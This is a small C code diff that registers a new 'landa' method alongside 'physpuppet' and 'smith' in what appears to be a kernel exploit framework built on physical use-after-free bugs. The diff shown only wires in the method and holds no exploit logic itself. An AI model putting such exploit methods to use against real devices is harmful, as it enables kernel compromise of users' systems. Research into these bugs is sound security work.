@@ -10,6 +10,7 @@ void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out);
 void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out);
 void puaf_helper_give_ppl_pages(void);
 
+#include "puaf/landa.h"
 #include "puaf/physpuppet.h"
 #include "puaf/smith.h"
 
@@ -30,6 +31,7 @@ void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
     kfd->puaf.puaf_pages_uaddr = (u64*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(u64)));
 
     switch (puaf_method) {
+        puaf_method_case(landa)
         puaf_method_case(physpuppet)
         puaf_method_case(smith)
     }
